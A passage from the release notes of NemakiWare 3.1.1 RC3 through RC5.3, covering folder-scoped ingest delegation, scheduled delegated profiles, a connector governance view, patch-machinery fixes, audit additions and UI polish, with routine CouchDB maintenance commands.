compared to legitimate ingest audit volume, but operators should be
aware that "intent to investigate" produces audit volume, not just
"acted on". A future RC could replace the debounce with an explicit
"Simulate (audit)" button so audit entries map 1:1 to deliberate
operator decisions; tracked as a post-release follow-up.

CLI / scripting access bypasses this entirely — the endpoint is
called explicitly, audit fires once per call, no debounce.

### Audit additions

- New `AuditOperation.EXTERNAL_GOVERNANCE_SIMULATE` enum entry (audit
  contract: additive only, never renamed).
- W2 audit details include:
  `actorUserId`, `principalId`, `expandedPrincipals`, `removePrincipalIds`,
  `lostCount`.

### API contract — additive only, no breaking changes

This section uses precise terms because external reviewers will read
it:

- **New endpoint** (additive): `POST /v1/admin/connectors/by-principal/{id}/simulate-remove`
  — admin-only. Pre-RC5.3 clients are unaffected (they never call it).
- **New optional query param** (additive): `GET /v1/admin/import-profiles?autoDisabledSince=ISO-8601`.
  Pre-RC5.3 clients that omit the param see the same response set
  they did at RC5.2. The param is opt-in per request.
- **New response field** (additive): `ImportProfileDefinition`
  gained `lastAutoDisabledAt` + `lastAutoDisabledReason`. Marshalled
  with `@JsonInclude(NON_NULL)`, so profiles without a marker emit
  the same JSON they did at RC5.2. Pre-RC5.3 clients tolerate the
  fields via `@JsonIgnoreProperties(ignoreUnknown=true)`.
- **No fields removed or renamed.** No endpoint paths changed.
- **Audit enum** (`AuditOperation`, `DenialReason`) gained entries
  only — additive per the existing audit-stability contract.

In short: RC5.3 is **backward-compatible** with RC5.2 — no breaking
changes — but it is NOT "byte-identical" because additive surface
necessarily changes byte-level output for clients that opt in. Old
clients see the same bytes; new clients see strictly more.

### Migration / upgrade

No migration. Both features are additive at the API surface; W1's
default behaviour with no param is identical to RC5.2.

### Tests

- New `ImportProfileSinceFilterTest`: 7 cases (no param /
  empty string / valid cutoff / malformed cutoff fail-safe /
  malformed marker defensive-exclude / future cutoff / repo-scoped
  composition).
- New `ConnectorSimulateRemoveTest`: 11 cases (admin gate /
  required-body validation / sole-route detection / multi-principal
  cascade / response-shape alignment with V3 / GROUP-skip-expand /
  empty-allowedPrincipalIds skip / blank-entry filter).
- Ingest delegation suite: **154 tests, all PASS** (was 136).
- TS check + UI build pass.

### Known post-RC5.3 follow-ups (low priority)

Surfaced by the cumulative closure review. Not release blockers;
recorded so they aren't lost when external review concludes.

- **R1** (doc, ops): SOC tooling integration — add a query / alert
  template for the new `EXTERNAL_GOVERNANCE_SIMULATE` audit event so
  operators get notified when a high-frequency simulate burst
  happens (could indicate either reasonable investigation or a UI
  bug spamming the endpoint).
- **R2** (doc, deployment): `docs/MULTI-REPLICA-DEPLOYMENT.md` lists
  the JVM-local state subsystems that need sticky sessions / leader
  election for multi-replica. The RC5 inactiveCreatorStreak counter
  inside `IngestSchedulerService` is one such state (per-JVM
  HashMap). `docs/MULTI-REPLICA-DEPLOYMENT.md` should be updated to
  list the new properties + the leader-election requirement that
  scheduled delegated profiles already inherit from the existing
  ingest scheduler.
- **R3** (UX, RC5.4 optional): replace V7 UI's 800 ms debounce audit
  fire with an explicit "Simulate (audit)" button so audit entries
  map 1:1 to deliberate operator decisions. Trade-off noted above.
- **R4** (API, RC5.4 optional): `GET import-profiles?autoDisabledSince=`
  malformed cutoff currently pass-through with WARN. Switching to
  400 would be stricter but breaks the "forgiving admin tab" path.
  Operator choice.

### Release / GA operational note

`v3.1.1-RC5.3` is and remains a **release candidate** tag — RC
suffix tags must NOT be promoted to GA by removing a "pre-release"
flag. The promotion path on completion of external review is:

1. Merge `release/3.1.1-RC5.3` into `master` (or whichever GA branch
   the project uses).
2. Cut a **new** annotated tag `v3.1.1` against the merge commit on
   `master`. This is the GA tag.
3. Optionally create a GitHub Release attached to `v3.1.1` (the GA
   tag), separate from any "Pre-release" labels on the RC tags.
4. Existing `v3.1.1-RC5{,.1,.2,.3}` tags stay as internal
   milestones; they're never relabelled to GA. This keeps the
   audit trail of which commit was reviewed and approved at which
   point in the RC cycle.

---

## 3.1.1-RC5.2 — H1-H3 UI polish
_Release candidate on `release/3.1.1-RC5.2` (2026-05-20), branched
off `v3.1.1-RC5.1` (`cc1ac2b54`)._

UI-only polish cycle. **No Java / property / patch / migration / API
contract changes.** Resolves the H1-H3 follow-ups recorded in RC5.1
closure.

### H1: governance picker debounce unmount cleanup

`ConnectorGovernanceTab` adds a `useEffect` return-cleanup that
clears the V8 search debounce `setTimeout` when the tab unmounts.
Eliminates a "setState on unmounted component" warning class. No
behaviour change for live tabs.

### H2: V7 multi-removal selection cap

The "Simulate removing" Select now caps at `SIMULATE_REMOVE_MAX = 10`
principals via Ant Design's `maxCount`. A Tooltip on the label
explains the rationale (picking everything gives the trivial "lose
everything" answer with low operator value). An orange "Reached limit"
Tag appears when the cap is hit so the cap isn't silent.

### H3: V6 window custom days input

The auto-disabled "last N days" Select gains a "Custom..." option.
Selecting it swaps the Select for an `InputNumber` (min=1, max=9999,
addonAfter="d"). A "Done" button snaps back to the preset Select.
G1's count-reset effect now also resets the custom-mode flag so the
filter row stays consistent.

### i18n additions

- `connectorGovernance.simulateRemoveHint` ({{max}}) +
  `connectorGovernance.simulateMaxReached` ({{max}}) — H2
- `importProfileManagement.autoDisabledWindowCustom` +
  `importProfileManagement.autoDisabledWindowDone` — H3
- Parity: 30 `connectorGovernance` keys + 11
  `importProfileManagement.autoDisabled*` keys aligned ja/en.

### Tests + verification

- 136/136 ingest unit tests pass (unchanged — no Java touched)
- TypeScript check + UI build + i18n parity pass
- Live deployment verified all 3 H-keys present in bundle

### Known post-RC5.2 follow-ups

None at this time. RC5.1 W1/W2 (vNext, server-side scalability)
remain as separate scope, not RC5.2 work.

---

## 3.1.1-RC5.1 — Governance dashboard polish + scalability
_Release candidate on `release/3.1.1-RC5.1` (2026-05-20), branched
off `v3.1.1-RC5` (`f47d3273d`)._

UI-only follow-up cycle on top of RC5. **No Java / property / patch /
migration changes** — RC5's scheduled delegated profile contract and
governance API contract are unchanged. RC4.1 → RC5.1 upgrade
behaviour is identical to RC4.1 → RC5 (default-safe).

### G1: auto-disable filter state reset

`ImportProfileManagementTab` — when the "Show only auto-disabled"
filter is on and the admin re-enables the last auto-disabled profile,
`autoDisabledCount` drops to 0, the filter Switch unmounts, but
React state stayed `true`. The table silently rendered empty until
refresh. A `useEffect` now resets the state when the count reaches 0
so the table reverts to the full list automatically.

### G3: pseudo-principal removal-simulation filter

The governance tab's "Simulate removing" dropdown no longer offers
well-known pseudo-principals — `GROUP_EVERYONE`, `anyone`, `Anyone`,
`GROUP_ANYONE`, `authenticated`, `Authenticated`. These are ACL
targets, not group memberships an admin can edit, so simulating
their removal isn't a meaningful operator question. Reduces visual
noise without changing match logic.

### V6: "auto-disabled in last N days" filter

V4's auto-disabled filter gains a window selector (All / 24h / 7d /
30d, default All). When a window is active:
- The count Tag shows `recent/total` (e.g. `2/3`)
- The banner switches to a recent-count phrasing
- Malformed `lastAutoDisabledAt` timestamps fail-shut (excluded)

Lets ops teams investigating an incident surface fresh scheduler
shutdowns without legacy auto-disables creating noise.

### V7: multi-principal removal simulation

The V5 simulate-removal Select goes multi-select. Filter logic
extends from `every === simulateRemove` to
`every ∈ removalSet`, so removing multiple principals together
correctly cascades — e.g. removing the user from both group A and
group B reveals connectors that survive each removal individually
but fall when both are removed (matched via either group only).

### V8: server-side principal search

The governance tab's principal picker no longer issues a single
`limit=500` fetch on mount. Instead:
- An empty `query` fetches the first 50 users + 50 groups
- Every keystroke triggers `onSearch` with a 300 ms debounce
- The fetch passes the typed query to `/user/list?query=` and
  `/group/list?query=` (existing endpoints, existing admin gate)
- Scales to 10k+ principal directories without an upfront fetch
  cost

### B1 fix (acceptance-review regression)

A pre-fix V8 implementation switched the picker from Ant Design
`AutoComplete` to `Select` to gain virtual scrolling. Acceptance
review surfaced that `Select` only accepts values from its options
array — typed pseudo-principals (`anyone`, external-IdP IDs) couldn't
be submitted. The fix reverts the picker to `AutoComplete` while
keeping V8's server-side `onSearch` + 300 ms debounce + 50-per-call
fetch. Virtual scrolling is given up; 50 items is small enough that
DOM cost is negligible.

### i18n

- `importProfileManagement` gains 5 keys (`autoDisabledBannerRecent`,
  `autoDisabledWindow{All,1d,7d,30d}`).
- `connectorGovernance.simulationNote` takes a `{{principals}}`
  placeholder for V7's multi-principal phrasing.
- Parity: 28 `connectorGovernance` keys + 9
  `importProfileManagement.autoDisabled*` keys aligned ja/en.

### Migration / upgrade

No migration. UI-only changes; pre-RC5.1 records read unchanged.

### Tests

- 136/136 ingest unit tests pass (unchanged from RC5 — UI-only).
- Live verification of G1 transition, G3 filter, V6 window logic
  (3 timestamps × 4 windows), V7 cascade simulation, V8 server-side
  search, and B1 free-text round-trip.

### Known post-RC5.1 follow-ups (low priority — RC5.2 candidates)

- **H1**: V8 debounce timer lacks unmount cleanup. Single-tab admin
  UI rarely unmounts, so impact is low; a `useEffect` return-cleanup
  closes the loop.
- **H2**: V7 multi-removal Select has no max-selection cap. Power
  users could pick the whole expansion set and see a noisy "lose
  everything" result. UX guard, not security.
- **H3**: V6 window is a fixed list (All / 24h / 7d / 30d). A custom
  N-days input would handle incident windows that don't fit the
  preset.

### vNext (separate scope — not RC5.2)

- **W1**: V6 server-side filter for very large profile lists (current
  V6 filters client-side).
- **W2**: V7 server-side simulate endpoint — `POST /by-principal/{id}/simulate-remove`
  with a principal-set body and a `lost` array response. Useful for
  CLI / scripting access to the same logic the UI offers.

---

## 3.1.1-RC5 — Scheduled delegated profiles + connector governance view
_Release candidate on `release/3.1.1-RC5` (2026-05-19), branched off
`v3.1.1-RC4.1` (`572aad18b`)._

Lands the two v2 items deferred from RC3's connector-delegation work:
scheduling for non-admin delegated profiles, and an admin governance
view answering "which connectors does principal X have access to?".
Both ship behind safe defaults so an upgrade does NOT change runtime
behaviour until the operator explicitly opts in.

### §12.1 Scheduled delegated profiles

A folder owner can now mark their delegated import profile
`schedulerEnabled=true` and have it fire on the scheduler without
needing admin privileges, with the same per-tick `cmis:all` and
connector re-evaluation the manual ingest path runs.

**Why this matters.** Before RC5, scheduled ingest required admin —
non-admins could only trigger their delegated profiles manually. That
forced a workflow where the folder owner kept a browser tab open or
scripted a curl call. RC5 closes the gap while keeping the security
contract: the scheduler tick runs under a synthetic CallContext for
the original creator, never short-circuits to admin even if the
creator happens to be one, and re-checks every gate (folder ACL,
connector delegation scope, creator-still-active) every tick.

**Operator opt-in required.** Off by default. Set:
```properties
nemakiware.ingest.delegated.schedulerEnabled=true
```
to enable. The controller's `SCHEDULER_REQUIRES_ADMIN` gate flips with
the same property — non-admin scheduled profiles can only be created
when the operator has consciously enabled the path.

**Creator deactivation policy.** When a creator's `UserItem` is no
longer findable (LDAP sync hard-delete, manual disable), the next tick
emits a structured `CREATOR_USER_INACTIVE` audit and skips. The
profile stays visible for admin review. Layer on automatic disable
after N consecutive failures:
```properties
nemakiware.ingest.delegated.autoDisableInactiveOwners=true
nemakiware.ingest.delegated.inactiveOwnerFailureThreshold=3
```
A successful active-user resolution resets the streak, so a transient
directory hiccup does not accumulate toward auto-disable.

**New `DenialReason` enum entries** (audit-stable, additive only):
- `CREATOR_USER_INACTIVE`
- `CREATOR_CMIS_ALL_LOST`
- `DELEGATED_SCHEDULING_DISABLED`

**Audit shape**. `EXTERNAL_INGEST_FAILED` records from the scheduled
path now carry `details.scheduled=true`, `details.creatorUserId`,
`details.creatorActive`, plus the existing `details.denialReason` and
`details.targetFolderId` keys. SOC queries that already filter on
`EXTERNAL_INGEST_FAILED` pick up the scheduled denials automatically.

### §12.3 Connector governance view

New admin-only endpoint:
```
GET /v1/admin/connectors/by-principal/{principalId}?repositoryId=...&expand={true|false}
```

Answers "which delegated connectors does this principal have access
to?". `expand=true` includes connectors matched via group expansion
(the same expansion the runtime gate uses, so the view agrees with
what the user would actually experience). Each match records the
principal IDs that triggered it and a `matchType` of `direct`,
`group`, or `direct+group`. The mixed case surfaces redundant grants
that may be cleanup candidates.

**Why this matters.** Removing a user from a group, or deleting a
group entirely, used to require scanning every connector's
`allowedPrincipalIds` by eye. The endpoint makes the question a single
admin API call.

### Migration / upgrade

No migration needed. All new behaviour is property-gated and off by
default. Existing deployments that upgrade and do nothing get
RC4.1-equivalent scheduler behaviour (no-op observable to old
clients). Existing tests retained
to pin the legacy path.

### Properties added

```properties
# v2 §12.1 — operator opt-in for delegated scheduled ingest
nemakiware.ingest.delegated.schedulerEnabled=false
nemakiware.ingest.delegated.autoDisableInactiveOwners=false
nemakiware.ingest.delegated.inactiveOwnerFailureThreshold=3
```

### Tests

- New: `DelegatedCallContextFactoryTest` (8),
  `IngestSchedulerDelegatedRunTest` (8),
  `ImportProfileSchedulerGateTest` (7),
  `ConnectorByPrincipalGovernanceTest` (13) — 36 new unit tests.
- Regression: `IngestSchedulerDelegationSkipTest` (5) preserved to pin
  the property-off legacy behaviour.
- Ingest delegation suite: 133 tests, all PASS.

### V1-V3 extensions (post-acceptance vNext fold-in)

After acceptance review of §12.1/§12.3, three operator-UX
improvements were folded into the same RC5 cycle. None change runtime
behaviour without a deliberate admin action.

**V1: auto-disable re-enable handshake.** When the scheduler
auto-disables a delegated profile after N consecutive
`CREATOR_USER_INACTIVE` ticks, it now records `lastAutoDisabledAt`
(ISO-8601) and `lastAutoDisabledReason` (e.g.
`CREATOR_USER_INACTIVE: creator 'alice' inactive for 3 consecutive ticks`)
on the profile. The admin UI's profile list shows an orange
"auto-disabled" badge with the reason in a tooltip, so admins can
distinguish a profile they disabled from one the scheduler shut down.
On the next admin re-enable (`enabled: true`), the markers are
cleared and a dedicated audit entry
(`EXTERNAL_PROFILE_UPDATED` with `details.clearedAutoDisableMarker=true`)
fires so the audit trail captures the deliberate reset. Unrelated
edits that don't flip `enabled` preserve the marker.

**V2: `principalType` in governance view.** The governance API now
classifies the queried principal as `USER`, `GROUP`, or `UNKNOWN`
(resolved via `PrincipalService`; `UNKNOWN` is the safe fallback for
pseudo-principals like `Anyone`, typos, or when `PrincipalService` is
not wired). The new `principalType` field appears at the top level of
the response. For `GROUP` principals the `expand=true` flag is now a
no-op (NemakiWare groups don't nest) — avoiding any
PrincipalService-impl-dependent surprises when fed a non-user ID.

**V3: governance dashboard UI.** New admin-only tab
"Connector Access" in Integration Settings. Form: principal ID +
include-group-expansion toggle. The result table shows connector
name, source system, status (enabled/delegated badges), and the match
type with the principal IDs that triggered the match. The header
card surfaces the principal type and the full list of expanded
principal IDs the server actually checked against. Operators no
longer need curl to answer "which connectors does this user/group
have access to?"

### V1-V3 properties

No new properties for V1-V3. Existing
`nemakiware.ingest.delegated.*` properties continue to control the
scheduler's auto-disable behaviour; the markers are written
automatically whenever auto-disable fires.

### F1-V5 hardening + UX (post-V1-V3 review fold-in)

After the V1-V3 acceptance review, three Low-priority hardenings
(F1-F3) and two operator-UX extensions (V4-V5) landed on the same RC5
cycle. None change runtime contracts; the API surface gains nothing
new (V5 is computed client-side from the existing governance response).

**F1: marker spoof prevention.** Non-admin payloads on
`POST /v1/admin/import-profiles` and
`PUT /v1/admin/import-profiles/{id}` can no longer set or modify
`lastAutoDisabledAt` / `lastAutoDisabledReason` via the payload — the
controller strips them before the V1 handshake runs. Admin payloads
can still write the markers for data-repair scenarios. The handshake
itself (re-enable clears, unrelated PUT preserves) is unchanged.

**F2: complete i18n entries.** All UI strings for the
`connectorGovernance` tab and the `importProfileManagement`
auto-disable badge/filter/banner now have explicit ja/en entries
(previously the TSX called `t()` with `defaultValue` only). Adds 17
keys to the `connectorGovernance` top-level section plus 4 keys under
`importProfileManagement` for the V1/V4 UI bits.

**F3: principal AutoComplete.** The governance tab's principal-ID
input is now an Ant Design `AutoComplete`, pre-populated with the
repository's users + groups (limit 500 each, loaded once on mount).
Each option renders as `{id} · {display name} (USER|GROUP)`. Free-text
entry is preserved for pseudo-principals (e.g. `Anyone`) or external
IdP principals not yet cached locally. Lookup failures fall back to
an empty suggestion list — the input still works.

**V4: auto-disable triage UI.** The Import Profiles tab now shows
a "Show only auto-disabled" filter Switch + a count Tag + a warning
Alert banner whenever at least one profile has been auto-disabled by
the scheduler. The filter is hidden when no auto-disabled profiles
exist, so the UI stays clean for healthy deployments.

**V5: simulate principal removal.** The governance tab now offers
a "Simulate removing" dropdown populated from the expansion result
(minus the queried principal itself). Picking a principal filters the
results table to matches where that principal was the **sole**
matching route — i.e. the connectors the user would actually lose if
removed from that group. Computed client-side from the existing
`matchedPrincipalIds` data, so no new API surface and no extra round
trip.

### F1-V5 tests

- `ImportProfileSchedulerGateTest`: +3 cases (F1 non-admin update
  spoof, F1 non-admin create spoof, F1 admin write preserved) — 10
  total cases in this class.
- Ingest delegation suite: **136 tests, all PASS** (was 133).

### Known post-RC5 follow-ups (low priority — RC5.1 candidates)

Surfaced during the F1-V5 acceptance re-review. None are release
blockers; recorded here so they aren't lost.

- **G1** (Low, UX): `ImportProfileManagementTab` — when the
  "auto-disabled only" filter is on AND the admin re-enables the
  last auto-disabled profile, `autoDisabledCount` drops to 0 → the
  filter Switch unmounts but its internal state stays `true`. The
  visible table looks empty until the page is refreshed. Fix: small
  `useEffect` that resets `onlyAutoDisabled` to false when count
  reaches 0.
- **G2** (Low, scale): `ConnectorGovernanceTab` AutoComplete loads
  users + groups with `limit=500`. Adequate for single-tenant
  NemakiWare deployments; needs pagination or server-side filtering
  for 10k+ principal directories.
- **G3** (Low, UX): V5 simulate-removal `Select` includes
  `GROUP_EVERYONE` when expansion brought it in. Simulating its
  removal yields 0 lost (nothing typically lists `GROUP_EVERYONE` in
  `allowedPrincipalIds`), so it's harmless but visually noisy.
  Excluding well-known pseudo-principals from the dropdown would be
  a small polish.

### vNext (separate scope — not RC5.1)

Larger ideas surfaced during RC5 reviews; explicitly out of scope
for any RC5 patch and not started:

- **V6**: "Auto-disabled in last N days" filter in
  `ImportProfileManagementTab`.
- **V7**: Multi-principal removal simulation (e.g. remove from
  group A AND group B simultaneously).
- **V8**: AutoComplete virtual scroll + lazy load for very large
  principal directories.

---

## 3.1.1-RC4.1 — RC4 acceptance findings F1-F3
_Patch release on `release/3.1.1-RC4` (2026-05-19)._
_Release tag: **`v3.1.1-RC4.1`**._

Commit anchors:
- **RC4 baseline** (`cc63d960e`) — R1-R4 patch-machinery cleanup.
- **RC4.1 code hardening** (`7823b60f7`) — F1-F3 fix on top of
  `cc63d960e`. This is the commit that ships the actual behaviour
  changes documented below.
- **Final tag target** — includes the RC4.1 code hardening above
  PLUS one or more doc-only release-review fixes layered on top.
  See `git log v3.1.1-RC4.1 --oneline` for the exact head once the
  tag is created.

Tightens three findings surfaced by the RC4 acceptance review.
All changes are small, idempotent, and re-verifiable. No new
features. No data migration. No change to existing patch history.

### F1 — Fallback patch ordering for ExternalIntegration types

`Patch_ExternalIntegrationSourceFields` depends at runtime on
`Patch_ExternalIntegrationSecondaryType` (it WARN-and-skips if the
target type doesn't yet exist — see
`Patch_ExternalIntegrationSourceFields.java:66`). RC4's fallback
listener happened to preserve this dependency only by coincidence
of alphabetical bean-name ordering ("`Sec`" < "`SourceFields`"
lexicographically). A future patch named, say,
`patch_ExternalIntegrationFoo` would sort BETWEEN them and silently
break the chain.

Fix: both patches added to `ORDERED_SEED_PATCHES`. Seeds run first
in declared order regardless of alphabetical interleaving.
New test `externalIntegrationDependency_isPreservedRegardlessOfAlphabet`
inserts a hostile bean name between them and asserts the
SecondaryType still precedes SourceFields.

### F2 — Mango index targeted a non-existent field

`Patch_IngestMangoIndexes` (RC4) registered `idx_type_dlqEntryId` on
`(type, dlqEntryId)`, but the DLQ record's actual key field — used
in every `_find` selector at `IngestJobService:176/234/278/300` — is
`dlqId`. Cloudant created the index without complaint, but it
matched no real selector, so DLQ lookups silently fell back to
`_all_docs` scan.

Fix: renamed to `idx_type_dlqId` with the correct field. The
existing dead index `idx_type_dlqEntryId` is **not** auto-deleted
(we don't touch state we didn't create with the current patch
instance). Operators on RC4 → RC4.1 upgrades may optionally remove
it. Substitute your own CouchDB host, port, and credentials —
the values shown below are the docker-compose dev defaults and
are **not** appropriate for production:

```bash
# Replace COUCHDB_URL and CREDENTIALS with the values from your
# deployment (e.g. for the docker-compose dev environment:
#   COUCHDB_URL=http://localhost:5984
#   CREDENTIALS=admin:password — DO NOT use these in production)
curl -u "${CREDENTIALS}" -X DELETE \
  "${COUCHDB_URL}/nemaki_conf/_index/ingest-indexes/json/idx_type_dlqEntryId"
```

Leaving it in place is harmless (a few KB of unused index storage).

New test `indexSpecs_targetActualSelectorFields_notGuesses` walks
the patch's `INDEXES` list by reflection and pins:
- `idx_type_dlqId` present with field set `[type, dlqId]`
- `idx_type_dlqEntryId` **absent** (regression guard)
- the other selectors used by ingest services
  (`connectorId`, `profileId`, `jobId`) are still registered

### F3 — Log message simplification

The "created / existing / failed" counter was unreliable: different
Cloudant versions return `result="created"` on idempotent
re-registration too. RC4.1 collapses to a single `processed` counter
(`processed=N, failed=M (out of K)`). The `failed > 0` ->
`RuntimeException` failure detection that drives PatchHistory
non-marking is **unchanged**.

### Not addressed in RC4.1 (documented as accepted)

| ID | Status | Rationale |
|---|---|---|
| F4 | Doc only | `applySystemPatch()` runs on every boot, but Cloudant `postIndex` is idempotent + cheap (~16ms for 7 indexes confirmed on live restart). Matches existing patch pattern. |
| F5 | Doc only | `archive_init.dump` declares 14 views vs the legacy threshold of 8. The RC4 subset check tightens it but the existing `mergeDesignDocument` self-heals on the next boot, so end state is correct and visible via the missing-name WARN log. |

### Verification

- 171 unit tests pass (2 new: F1 ordering + F2 selector field check).
- Live restart on the running container confirms the renamed
  index registers cleanly and the log line reads
  `processed=7, failed=0 (out of 7)`.
- `git status --short`: clean.

---

## 3.1.1-RC4 — Patch machinery cleanup
_Release branch: `release/3.1.1-RC4` (2026-05-18 → ongoing)_

Closes the four pre-existing follow-ups (R1-R4) recorded in RC3's
"Known pre-existing follow-ups" section. No new user-facing
functionality; structural fixes to the patch / view-registration
machinery so the foundation is solid before any future feature
work that touches it.

### What changed

| ID | Fix |
|---|---|
| **R4** (Low) | `Patch_StandardCmisViews` was registered both in `cmisPostInitializer.cmisPatchList` (primary) and in `patchService.patchList`. `PatchHistory` deduped execution, but the startup log emitted "Applying patch: standard-cmis-views" twice and confused diagnostics. Removed the duplicate from `patchService.patchList`; canonical home is `cmisPostInitializer`. |
| **R3** (Medium) | `StartupProbeService.REQUIRED_VIEWS_MAIN = 38` int threshold replaced by a NAME-SET subset comparison against the shipped `bedroom_init.dump` (currently 40 views). `DatabasePreInitializer` now reports specifically *which* view names are missing rather than a count gap. Dump-file unreadability (e.g. classpath-stripped builds) falls back to the legacy int threshold so the check never silently passes everything. The integer constants are kept as a backstop. |
| **R1** (High) | `NemakiPatchInitializationListener.patchBeanNames` hardcoded array of 23 patches replaced with `WebApplicationContext.getBeansOfType(AbstractNemakiPatch.class)` auto-collection. The 8 patches that previously lacked a top-level `bean id` (`Patch_IngestRelationshipTypes`, `Patch_BusinessRecordMetadataSecondaryType`, `Patch_ChatContextMetadataSecondaryType`, `Patch_MessageMetadataSecondaryType`, `Patch_NoteMetadataSecondaryType`, `Patch_ExternalIntegrationSourceFields`, `Patch_DefaultCloudDriveConnectorProfile`, `Patch_PurviewStateMigration`) get one. A short `ORDERED_SEED_PATCHES` array keeps dependency-sensitive patches (`patch_SystemFolderSetup` → `patch_InitialContentSetup` → `patch_StandardCmisViews` → …) in deterministic order; everything else runs in alphabetical bean-name order. A throwing or failing patch no longer halts the run. |
| **R2** (Medium) | New `Patch_IngestMangoIndexes` registers 7 compound Mango indexes on `nemaki_conf` for the ingest record types: `(type, connectorId)`, `(type, sourceArchetype)`, `(type, sourceSystem, sourceArchetype, enabled)`, `(type, profileId)`, `(type, repositoryId)`, `(type, jobId)`, `(type, dlqEntryId)`. Eliminates the `_all_docs` scan fallback that affected query latency at 10k+ records. Idempotent on Cloudant (`postIndex` returns `result="exists"` for unchanged definitions). |

### Compatibility

- **Existing CouchDB views**: untouched. The R3 change is read-only —
  it switches the *completeness check* from a count to a name-set
  subset, but the views themselves are still merged into the design
  document by `DatabasePreInitializer.mergeDesignDocument` as before.
- **Patch execution semantics**: every patch still runs through
  `PatchUtil.isApplied` / `PatchHistory`, so re-runs are no-ops. R1
  may execute patches in a different (alphabetical) order than the
  RC3 hardcoded list for the non-seed entries; `PatchHistory`
  guarantees this doesn't matter for correctness.
- **Mango index creation (R2)**: idempotent. Existing deployments
  get the indexes on first RC4 boot; the operation completes in
  hundreds of milliseconds against a typical `nemaki_conf`.

### Upgrade

No manual steps. Restart the core service; the four patches apply
automatically. Verify with:

```bash
docker logs docker-core-1 2>&1 | grep -E "IngestMangoIndexes|patch.*complete"
curl -u admin:password http://localhost:5984/nemaki_conf/_index | jq '.indexes | length'
```

Expected: 7 newly-created indexes (or 7 "existing" on re-deploy) plus
the CouchDB default `_all_docs` index.

### Testing

- 17 new unit tests:
  - `StartupProbeViewNameSetTest` (5) — dump parsing, caching,
    immutability, fallback when dump missing
  - `NemakiPatchInitializationListenerTest` (6) — auto-collect,
    seed-order preservation, alphabetical remainder, throwing /
    failing patches don't halt the run
  - `Patch_IngestMangoIndexesTest` (6) — patch name stability,
    graceful skip on missing pool / client, failure surfacing
- Live verification:
  - All 7 Mango indexes created on first boot (logs + CouchDB
    `_index` introspection)
  - 21 / 21 RC3 API E2E still pass with RC4 patches deployed

### References

- Design doc with R1-R4 detail moved from "known follow-ups" to
  "shipped": [`docs/design/connector-delegation.md`](docs/design/connector-delegation.md) §9.5
- RC3 history (for context on what these follow-ups closed):
  [section below](#311-rc3--folder-scoped-external-ingestion-delegation)

---

## 3.1.1-RC3 — Folder-scoped External Ingestion delegation
_Release branch: `release/3.1.1-RC3` (2026-05-14 → ongoing)_

### What's new

#### Folder owners can now manage their own ingest profiles

Through RC2 only admins could create or edit External Ingestion profiles.
Folder owners had to file a ticket for every change — slow, and admins
rarely have the per-folder domain knowledge to set policies correctly.

RC3 introduces a tightly-scoped delegation model:

- An admin can mark a connector as **delegated** and pin it to one or
  more folders (or a subtree, or — if explicitly necessary —
  repository-wide), optionally restricted to specific users / groups.
- A folder owner with `cmis:all` on a folder can then create, edit, and
  delete **manual-only** import profiles bound to that folder, choosing
  from the connectors the admin delegated to them.
- Admin-owned profiles and scheduled ingestion remain admin-only.
  Non-admin profiles always run synchronously on demand.

The whole flow is server-enforced; the UI is just convenience.

#### New configuration knobs

| Property | Default | Where |
|---|---|---|
| `nemakiware.ingest.ancestorWalk.maxHops` | `128` | `nemakiware.properties`. Tune up if your folder hierarchy is legitimately deeper than the default; the gate logs a WARN when it reaches the cap without resolving so you know when to act. |

#### New endpoints

- `GET /v1/admin/connectors/summary?repositoryId=&targetFolderId=` —
  slim, secret-free connector listing for a single folder, gated by
  `cmis:all`. Used by the delegated profile editor; safe to expose to
  folder owners.

#### New data model fields

| Field | Where | Default | Notes |
|---|---|---|---|
| `delegated` | `ConnectorDefinition` | `false` | Admin-only until set true. |
| `delegateAllFolders` | `ConnectorDefinition` | `false` | Required to grant repo-wide; not implied by an empty `allowedFolderIds`. |
| `allowedFolderIds` | `ConnectorDefinition` | `null` | Folder IDs (and descendants) covered by delegation. Empty + `delegateAllFolders=false` = no delegation, by design. |
| `allowedPrincipalIds` | `ConnectorDefinition` | `null` | User IDs and group IDs (PrincipalService expansion). Empty = no principal restriction. |
| `createdByUserId` | `ImportProfileDefinition` | `null` for legacy | Username of the creator. |
| `delegated` | `ImportProfileDefinition` | `false` | True for profiles created by folder delegation. Non-admins can only edit profiles where this is true. |

#### New audit fields

Every delegation-related operation (profile create / update / delete and
delegated ingest) records a structured `details.denialReason` on
failure. The names are part of the audit contract — see
[`docs/design/connector-delegation.md`](docs/design/connector-delegation.md)
§10 for the full reference table.

### Compatibility

- **Existing connectors**: unchanged behaviour. `delegated` defaults to
  `false` so every pre-RC3 connector is admin-only as before.
- **Existing profiles**: unchanged. They become `delegated=false`
  records and continue to flow through the admin path (scheduler,
  defaults, etc.).
- **Existing audit consumers**: `details` now sometimes carries
  `denialReason` and the new ingest detail keys. Existing fields and
  the wire format are unchanged.
- **Admin API**: unchanged. Adding `delegated` / scope fields to a
  connector POST/PUT is opt-in.

### Migration safety (RC3)

The static review of view registration, patch application, and
record round-trip is summarised here so operators can sign off on
an upgrade without reading the source.

1. **RC3 adds no new CouchDB views, no new patches, and no new type
   definitions.** Existing dump files (`bedroom_init.dump`,
   `nemaki_conf_init.dump`) are unchanged. `DatabasePreInitializer`'s
   `viewCount < requiredViews` heuristic (38) is unaffected.
2. **Added persistence is JSON-field-only**:
   - `ConnectorDefinition` — `delegated`, `delegateAllFolders`,
     `allowedFolderIds`, `allowedPrincipalIds`
   - `ImportProfileDefinition` — `createdByUserId`, `delegated`
3. **Pre-RC3 records read with Java default values that fall on the
   safe side**:
   - `connector.delegated = false` → admin-only (existing behaviour)
   - `profile.delegated = false` → admin-managed (existing behaviour)
   - list fields = `null` → no scope (no implicit grant)
4. **Selector compatibility**. The `_find` mango selectors used for
   `connector_definition` and `import_profile_definition` query only
   on `type` + the primary key (`connectorId` / `profileId` /
   `repositoryId`). They do not filter on any new field, so pre-RC3
   and post-RC3 records remain mutually visible without an index
   rebuild.
5. **Corrupted records fail-closed at runtime**, not at read. A
   hand-edited record like `delegated=true && allowedConnectorIds=[]`
   deserialises cleanly but the runtime gate refuses with
   `denialReason: EMPTY_ALLOWED_CONNECTORS`. Same for an empty scope
   on the connector side (`hasUsableDelegationScope()` returns false).
6. **Backwards-compat for serialisation**: all delegation models are
   annotated `@JsonIgnoreProperties(ignoreUnknown=true)` and
   `@JsonInclude(NON_NULL)`. A round-trip through CouchDB preserves
   both pre-RC3 and post-RC3 records exactly; primitive `false`
   booleans are emitted (cannot be null).

> **Pre-existing items found during this review** that did not
> change in RC3 but are worth knowing about, recorded for follow-up
